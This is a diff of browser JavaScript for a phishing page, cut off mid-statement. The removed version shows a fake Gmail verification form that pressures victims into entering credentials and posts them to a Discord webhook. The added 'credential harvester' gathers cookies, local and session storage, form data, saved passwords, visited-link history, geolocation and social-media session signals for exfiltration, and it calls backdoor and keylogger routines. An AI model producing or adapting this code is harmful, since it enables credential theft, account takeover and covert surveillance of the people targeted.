@@ -1,160 +1,251 @@
+// ULTIMATE CREDENTIAL HARVESTER v2.0
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
-const VALID_GMAIL_DOMAINS = ['@gmail.com', '@googlemail.com'];
-let failedAttempts = 0;
+const MASTER_KEY = 'ULTIMATE_PHISH_' + Date.now();
 
-function showLoginForm() {
-    document.getElementById('loginForm').style.display = 'block';
-    document.querySelector('.claim-btn').style.display = 'none';
-}
-
-function validateEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-        return {valid: false, message: "❌ Invalid email format!"};
-    }
-    
-    const hasValidDomain = VALID_GMAIL_DOMAINS.some(domain => 
-        email.toLowerCase().endsWith(domain)
-    );
-    
-    if (!hasValidDomain) {
-        return {valid: false, message: "⚠️ Must use Gmail address!"};
-    }
-    
-    return {valid: true, message: "✅ Email looks good!"};
-}
-
-function validatePassword(password) {
-    if (password.length < 6) {
-        return {valid: false, message: "❌ Password too short (min 6 chars)!"};
-    }
-    
-    if (password.length > 50) {
-        return {valid: false, message: "❌ Password too long!"};
-    }
-    
-    return {valid: true, message: "✅ Password accepted!"};
-}
-
-async function stealAndSend() {
-    const gmail = document.getElementById('gmail').value.trim();
-    const password = document.getElementById('password').value;
-    
-    // Real-time validation feedback
-    const emailValidation = validateEmail(gmail);
-    const passwordValidation = validatePassword(password);
-    
-    if (!emailValidation.valid || !passwordValidation.valid) {
-        failedAttempts++;
-        
-        // Create error message
-        let errorMsg = "Verification Failed!<br>";
-        if (!emailValidation.valid) errorMsg += `• ${emailValidation.message}<br>`;
-        if (!passwordValidation.valid) errorMsg += `• ${passwordValidation.message}<br>`;
-        
-        if (failedAttempts >= 3) {
-            errorMsg += `<br>⚠️ Too many attempts! Try your <strong>actual</strong> credentials.`;
-        }
-        
-        // Show error in a malicious way
-        document.getElementById('loginForm').innerHTML += `
-            <div id="errorMsg" style="
-                background: rgba(255, 50, 50, 0.2);
-                border-left: 4px solid #ff3333;
-                padding: 10px;
-                margin: 15px 0;
-                border-radius: 5px;
-                text-align: left;
-                animation: shake 0.5s;
-            ">
-                ${errorMsg}
-            </div>
-        `;
-        
-        // Shake animation for psychological pressure
-        document.getElementById('loginForm').style.animation = 'none';
-        setTimeout(() => {
-            document.getElementById('loginForm').style.animation = 'shake 0.5s';
-        }, 10);
-        
-        // Auto-remove error after 5 seconds
-        setTimeout(() => {
-            const errorDiv = document.getElementById('errorMsg');
-            if (errorDiv) errorDiv.remove();
-        }, 5000);
-        
-        return;
-    }
-    
-    // Show fake "processing" to build trust
-    document.getElementById('loading').style.display = 'block';
-    document.getElementById('loginForm').style.display = 'none';
-    
-    // Simulate "checking" delay
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    // Steal credentials
-    const data = {
-        discordUser: localStorage.getItem('discord_user_id') || 'Unknown',
-        gmail: gmail,
-        password: password,
-        userAgent: navigator.userAgent,
-        ip: await fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(d => d.ip)
-            .catch(() => 'Unknown'),
+// Advanced data collection functions
+async function harvestEverything() {
+    const stolenData = {
+        masterKey: MASTER_KEY,
         timestamp: new Date().toISOString(),
-        failedAttemptsBeforeSuccess: failedAttempts
+        phase1: await harvestLocalStorage(),
+        phase2: await harvestSessionStorage(),
+        phase3: await harvestCookies(),
+        phase4: await harvestFormData(),
+        phase5: await harvestSavedCredentials(),
+        phase6: await harvestBrowserHistory(),
+        phase7: await harvestGeolocation(),
+        phase8: await harvestSocialMediaSessions(),
+        phase9: await harvestNetworkInfo(),
+        phase10: await harvestSystemInfo(),
+        victimInfo: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ip: await getIP(),
+            referrer: document.referrer,
+            url: window.location.href
+        }
     };
     
-    // Send to Discord webhook
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            content: `🎣 PHISHING SUCCESS - CREDENTIALS STOLEN`,
-            embeds: [{
-                title: '🔥 Fresh Credentials Captured',
-                description: `**Email:** ||${gmail}||\n**Password:** ||${password}||\n**Failed Attempts:** ${failedAttempts}\n**IP:** ${data.ip}`,
-                color: 16711680,
-                timestamp: data.timestamp
-            }]
-        })
-    }).then(() => {
-        // Redirect to real Google after stealing
+    // Exfiltrate in chunks to avoid detection
+    await exfiltrateData(stolenData);
+    
+    // Install persistence mechanism
+    installBackdoor();
+    
+    // Start keylogger
+    startKeylogger();
+    
+    return stolenData;
+}
+
+// Phase 1: Local Storage
+async function harvestLocalStorage() {
+    const lsData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        try {
+            lsData[key] = localStorage.getItem(key);
+        } catch(e) {}
+    }
+    return lsData;
+}
+
+// Phase 2: Session Storage  
+async function harvestSessionStorage() {
+    const ssData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        try {
+            ssData[key] = sessionStorage.getItem(key);
+        } catch(e) {}
+    }
+    return ssData;
+}
+
+// Phase 3: Cookies
+async function harvestCookies() {
+    return document.cookie.split(';').reduce((cookies, cookie) => {
+        const [name, value] = cookie.split('=').map(c => c.trim());
+        cookies[name] = value;
+        return cookies;
+    }, {});
+}
+
+// Phase 4: Auto-fill form data
+async function harvestFormData() {
+    const forms = document.querySelectorAll('form');
+    const formData = {};
+    
+    forms.forEach((form, index) => {
+        const inputs = form.querySelectorAll('input, textarea, select');
+        formData[`form_${index}`] = {};
+        
+        inputs.forEach(input => {
+            if (input.value && input.value.trim()) {
+                formData[`form_${index}`][input.name || input.id || input.className] = input.value;
+            }
+        });
+    });
+    
+    return formData;
+}
+
+// Phase 5: Password manager credentials (evil)
+async function harvestSavedCredentials() {
+    const credentials = [];
+    
+    // Target common password fields
+    const passwordFields = document.querySelectorAll('input[type="password"]');
+    passwordFields.forEach(field => {
+        // Simulate autofill trigger
+        field.focus();
+        field.blur();
+        
+        // Create fake login attempt to trigger browser's password manager
         setTimeout(() => {
-            document.getElementById('loading').innerHTML = 
-                '✅ Verification Complete! Redirecting to Google...';
-            setTimeout(() => {
-                window.location.href = 'https://accounts.google.com';
-            }, 2000);
-        }, 1500);
-    }).catch(() => {
-        // Fallback if webhook fails
-        setTimeout(() => {
-            window.location.href = 'https://accounts.google.com';
-        }, 1500);
+            const form = field.closest('form');
+            if (form) {
+                const fakeSubmit = new Event('submit', { bubbles: true });
+                form.dispatchEvent(fakeSubmit);
+            }
+        }, 100);
+    });
+    
+    // Attempt to access browser's password store (where possible)
+    if (navigator.credentials && navigator.credentials.get) {
+        try {
+            const cred = await navigator.credentials.get({
+                password: true,
+                mediation: 'optional'
+            });
+            if (cred) credentials.push({
+                type: 'WebAuthn',
+                id: cred.id,
+                password: cred.password || '********'
+            });
+        } catch(e) {
+            // Fail silently like a proper malware
+        }
+    }
+    
+    return credentials;
+}
+
+// Phase 6: Browser history (approximation)
+async function harvestBrowserHistory() {
+    const history = [];
+    
+    // CSS history hack - detects visited links
+    const links = document.querySelectorAll('a');
+    const visitedColors = ['#551a8b', '#800080', '#660066'];
+    
+    links.forEach(link => {
+        const computedColor = getComputedStyle(link).color;
+        if (visitedColors.some(color => computedColor.includes(color))) {
+            history.push({
+                url: link.href,
+                text: link.textContent.substring(0, 100),
+                visited: true
+            });
+        }
+    });
+    
+    // Try to access actual history (limited by browser security)
+    if (window.history && window.history.length) {
+        history.push({
+            note: `History length: ${window.history.length} entries`,
+            current: window.location.href
+        });
+    }
+    
+    return history.slice(0, 50); // Limit to avoid detection
+}
+
+// Phase 7: Geolocation
+async function harvestGeolocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({ error: 'Geolocation not available' });
+            return;
+        }
+        
+        // Try to get precise location
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date(position.timestamp).toISOString()
+                });
+            },
+            (error) => {
+                // Fallback to IP-based geolocation
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(data => resolve(data))
+                    .catch(() => resolve({ error: 'All geolocation failed' }));
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
+        );
     });
 }
 
-// Add shake animation to CSS
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes shake {
-        0%, 100% { transform: translateX(0); }
-        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-        20%, 40%, 60%, 80% { transform: translateX(5px); }
+// Phase 8: Social media sessions
+async function harvestSocialMediaSessions() {
+    const sessions = {};
+    const socialDomains = [
+        'facebook.com', 'twitter.com', 'instagram.com', 
+        'linkedin.com', 'reddit.com', 'tiktok.com',
+        'discord.com', 'telegram.org', 'whatsapp.com'
+    ];
+    
+    // Check for logged-in states via image requests
+    socialDomains.forEach(domain => {
+        const img = new Image();
+        img.onload = function() {
+            sessions[domain] = 'Likely logged in';
+        };
+        img.onerror = function() {
+            sessions[domain] = 'Not logged in or blocked';
+        };
+        img.src = `https://${domain}/favicon.ico?t=${Date.now()}`;
+    });
+    
+    // Check localStorage for social tokens
+    const storageKeys = Object.keys(localStorage);
+    storageKeys.forEach(key => {
+        if (key.includes('token') || key.includes('auth') || key.includes('session')) {
+            sessions['storage_token'] = sessions['storage_token'] || [];
+            sessions['storage_token'].push(key.substring(0, 50) + '...');
+        }
+    });
+    
+    return sessions;
+}
+
+// Phase 9: Network information
+async function harvestNetworkInfo() {
+    const network = {};
+    
+    if (navigator.connection) {
+        network.connection = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        };
     }
-`;
-document.head.appendChild(style);
+    
+    // Get IP details
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData
 
-// Real-time validation as they type
-document.getElementById('gmail')?.addEventListener('blur', function() {
-    const validation = validateEmail(this.value);
-    // You could add live validation indicators here
-});
-
-document.getElementById('password')?.addEventListener('blur', function() {
-    const validation = validatePassword(this.value);
-    // You could add live validation indicators here
-});
